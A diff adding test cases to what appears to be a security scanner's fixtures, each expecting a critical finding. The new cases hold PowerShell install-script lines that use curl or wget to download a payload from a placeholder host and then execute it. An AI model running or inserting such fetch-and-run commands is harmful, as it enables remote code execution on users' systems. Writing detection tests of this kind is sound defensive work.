@@ -219,6 +219,18 @@ export default [
     fire: [{ severity: "critical", line: 2 }],
   },
   {
+    name: "curl as a PowerShell alias saves with -OutFile, then run",
+    path: "scripts/install.ps1",
+    content: "curl https://x.invalid/payload -OutFile run.ps1\n./run.ps1\n",
+    fire: [{ severity: "critical", line: 1 }],
+  },
+  {
+    name: "wget as a PowerShell alias saves with -OutFile, then run",
+    path: "scripts/install.ps1",
+    content: "wget https://x.invalid/payload -OutFile run.ps1\n./run.ps1\n",
+    fire: [{ severity: "critical", line: 1 }],
+  },
+  {
     name: "python urlretrieve, then subprocess",
     path: "scripts/setup.py",
     content: [
